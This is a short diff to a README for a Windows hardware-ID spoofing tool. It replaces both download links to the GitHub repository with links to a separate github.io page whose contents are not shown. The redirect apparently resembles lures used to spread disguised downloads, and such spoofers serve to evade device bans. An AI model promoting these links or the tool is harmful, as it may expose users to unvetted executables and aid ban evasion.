@@ -6,7 +6,7 @@ Temp-Spoofer-LifeTime is a hardware identity cycling tool built for Windows 10 a
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-Temp--Spoofer--LifeTime-blue?style=for-the-badge&logo=github)](https://github.com/Muchainj123/Temp-Spoofer-LifeTime)
+[![Download Now](https://img.shields.io/badge/Download-Temp--Spoofer--LifeTime-blue?style=for-the-badge&logo=github)](https://muchainj123.github.io)
 
 Visit this link to download the application.
 
@@ -77,7 +77,7 @@ No internet connection is needed for the tool to function.
 
 ## 🔗 Downloads
 
-[Download Temp-Spoofer-LifeTime](https://github.com/Muchainj123/Temp-Spoofer-LifeTime)
+[Download Temp-Spoofer-LifeTime](https://muchainj123.github.io)
 
 ## 📄 License
 
